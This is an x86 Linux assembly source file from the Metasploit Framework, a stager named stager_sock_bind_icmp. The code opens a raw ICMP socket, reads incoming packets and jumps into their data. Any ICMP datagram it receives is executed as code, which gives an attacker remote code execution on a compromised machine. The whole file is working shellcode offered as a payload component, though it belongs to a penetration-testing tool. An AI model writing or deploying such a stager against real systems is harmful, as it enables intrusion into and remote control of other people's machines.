;;
; 
;        Name: stager_sock_bind_icmp
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1414 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux bind ICMP stager.  This means it
;        listens for ICMP echo requests and attempts to execute their
;        payload.  Right now it's kind of risky because any ICMP
;        datagram that it sees will cause it to try to execute its 
;        payload.  This could be improved with a tag based system.
;
;;
BITS   32
GLOBAL _start

_start:

socket:
	push byte 0x1
	pop  ebx
	push ebx
	push byte 0x3
	push byte 0x2
	push byte 0x66
	pop  eax
	cdq
	mov  ecx, esp
	int  0x80
	xchg eax, ebx

read:
	mov  al, 0x3
	mov  dh, 0xc
	int  0x80
	push byte 0x1c
	pop  edx
	add  ecx, edx
	jmp  ecx
